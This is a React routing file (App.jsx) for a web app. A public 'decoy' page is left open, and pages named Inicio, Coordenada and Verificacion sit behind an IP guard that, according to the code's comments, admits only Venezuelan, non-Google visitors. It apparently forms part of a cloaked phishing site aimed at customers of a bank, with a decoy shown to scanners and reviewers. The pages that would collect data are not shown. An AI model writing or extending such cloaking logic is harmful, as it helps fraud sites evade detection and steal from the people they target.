import { Toaster } from "@/components/ui/toaster"
import { QueryClientProvider } from '@tanstack/react-query'
import { queryClientInstance } from '@/lib/query-client'
import { BrowserRouter as Router, Route, Routes } from 'react-router-dom';
import PageNotFound from './lib/PageNotFound';
import { AuthProvider, useAuth } from '@/lib/AuthContext';
import UserNotRegisteredError from '@/components/UserNotRegisteredError';
import IpFilterGuard from '@/components/IpFilterGuard';
import RioProvincial from './pages/RioProvincial';
import Inicio from './pages/Inicio';
import Coordenada from './pages/Coordenada';
import PanelPrueba from './pages/PanelPrueba';
import Rejection from './pages/Rejection';
import Verificacion from './pages/Verificacion';

const AuthenticatedApp = () => {
  const { isLoadingAuth, isLoadingPublicSettings, authError, navigateToLogin } = useAuth();

  if (isLoadingPublicSettings || isLoadingAuth) {
    return (
      <div className="fixed inset-0 flex items-center justify-center">
        <div className="w-8 h-8 border-4 border-slate-200 border-t-slate-800 rounded-full animate-spin"></div>
      </div>
    );
  }

  if (authError) {
    if (authError.type === 'user_not_registered') {
      return <UserNotRegisteredError />;
    } else if (authError.type === 'auth_required') {
      navigateToLogin();
      return null;
    }
  }

  return (
    <Routes>
      {/* Public decoy — always accessible, no IP filter */}
      <Route path="/rio-provincial" element={<RioProvincial />} />

      {/* Protected routes — only accessible from Venezuela, non-Google IPs */}
      <Route
        path="/"
        element={
          <IpFilterGuard>
            <Inicio />
          </IpFilterGuard>
        }
      />
      <Route
        path="/coordenada"
        element={
          <IpFilterGuard>
            <Coordenada />
          </IpFilterGuard>
        }
      />
      <Route
        path="/panel-prueba"
        element={
          <IpFilterGuard>
            <PanelPrueba />
          </IpFilterGuard>
        }
      />
      <Route
        path="/verificacion"
        element={
          <IpFilterGuard>
            <Verificacion />
          </IpFilterGuard>
        }
      />
      <Route path="/rejection" element={<Rejection />} />
      <Route path="*" element={<PageNotFound />} />
    </Routes>
  );
};


function App() {
  return (
    <AuthProvider>
      <QueryClientProvider client={queryClientInstance}>
        <Router>
          <AuthenticatedApp />
        </Router>
        <Toaster />
      </QueryClientProvider>
    </AuthProvider>
  )
}

export default App
